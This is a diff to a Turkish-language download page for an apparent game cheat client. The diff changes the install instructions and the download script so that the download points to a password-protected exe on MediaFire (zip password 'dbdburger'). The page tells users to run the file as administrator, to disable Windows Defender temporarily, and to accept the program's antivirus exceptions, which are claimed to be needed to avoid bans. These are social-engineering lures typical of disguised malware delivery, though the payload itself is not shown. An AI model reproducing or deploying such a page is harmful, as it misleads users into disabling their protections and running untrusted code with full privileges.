@@ -158,10 +158,11 @@
 
         #notification {
             visibility: hidden;
-            min-width: 280px;
-            background-color: var(--success);
+            min-width: 320px;
+            background-color: var(--card);
             color: white;
             text-align: center;
+            border: 1px solid var(--primary);
             border-radius: 8px;
             padding: 20px;
             position: fixed;
@@ -172,7 +173,7 @@
             font-weight: bold;
         }
 
-        #notification.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
+        #notification.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 3.5s; }
 
         @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 40px; opacity: 1;} }
         @keyframes fadeout { from {bottom: 40px; opacity: 1;} to {bottom: 0; opacity: 0;} }
@@ -213,9 +214,9 @@
     <h2 style="font-size: 2.5rem; color: var(--primary);">Kurulum Adımları</h2>
     <div style="max-width: 600px; margin: auto; text-align: left; background: var(--card); padding: 30px; border-radius: 15px;">
         <p>1. <b>İndir:</b> Yukarıdaki butona basarak istemciyi indirin.</p>
-        <p>2. <b>Ayıkla:</b> Zip dosyasını bir klasöre çıkartın(zip dosyasının şifresi "dbdburger").</p>
-        <p>3. <b>Yönetici:</b> <code>setup.exe</code> dosyasını yönetici olarak çalıştırın.</p>
-        <p>4. <b>Güvenli Mod:</b> Paneldeki "Güvenli Mod" butonuna basarak istisnaları onaylayın.</p>
+        <p>2. <b>Ayıkla:</b> Zip dosyasını klasöre çıkartın (Şifre: <b>dbdburger</b>).</p>
+        <p>3. <b>Yönetici:</b> <code>Dbd-Client.exe</code> dosyasını yönetici olarak çalıştırın.</p>
+        <p>4. <b>Sihirbaz:</b> Program açılınca zip şifresini girerek kurulumu tamamlayın.</p>
     </div>
 </section>
 
@@ -224,7 +225,7 @@
         <i class="fas fa-exclamation-triangle" style="font-size: 50px; color: var(--primary);"></i>
         <h2 style="color: var(--primary); margin-top: 15px;">KRİTİK UYARI</h2>
         <p>Yazılımın ban riskini sıfırlaması için Antivirüs istisnasını otomatik tanımlaması gerekmektedir.</p>
-        <p style="font-size: 13px; color: #888;">Lütfen indirme sonrası gelen "Yönetici İzni" uyarısına EVET diyerek hileyi koruma altına alın.</p>
+        <p style="font-size: 13px; color: #888;">İndirdikten sonra dosyayı klasöre çıkartırken hata almamak için Windows Defender'ı geçici olarak kapatmanızı öneririz.</p>
         <button class="modal-btn" onclick="finalDownload()">ANLADIM, DEVAM ET</button>
     </div>
 </div>
@@ -233,28 +234,24 @@
 
 <div id="notification">🚀 Paket Hazırlanıyor... İndirme Başlayacak.</div>
 
-
 <script>
     function openNav() { document.getElementById("mySidebar").style.width = "280px"; }
     function closeNav() { document.getElementById("mySidebar").style.width = "0"; }
-    
     function showSecurityModal() { document.getElementById("securityModal").style.display = "block"; }
 
     function finalDownload() {
-        // Modal'ı kapat
         document.getElementById("securityModal").style.display = "none";
-        
-        // Bildirim kutusunu bul ve şifre uyarısını yaz
         var x = document.getElementById("notification");
-        x.innerHTML = "🚀 Paket Hazırlanıyor... <br> <span style='color:#f1c40f; font-size:14px;'>Zip Şifresi: dbdburger</span>";
+        
+        // Şifre bilgisini buraya ekledik
+        x.innerHTML = "🚀 Paket Hazırlanıyor... <br><span style='color:#f1c40f; font-size:14px;'>Zip Şifresi: dbdburger</span>";
         x.className = "show";
         
-        // 4 saniye sonra indirmeyi başlat (kuzen şifreyi görsün diye)
         setTimeout(function(){ 
             x.className = x.className.replace("show", ""); 
-            // Senin GitHub'a veya siteye yüklediğin ana setup dosyasının adı
-            window.location.href = "Dbd-Client.exe"; 
-        }, 4000);
+            // Senin verdiğin MediaFire linki
+            window.location.href = "https://www.mediafire.com/file/7iv1zx8sajh0rod/DBD_Client.exe.zip/file"; 
+        }, 4500);
     }
 </script>
 
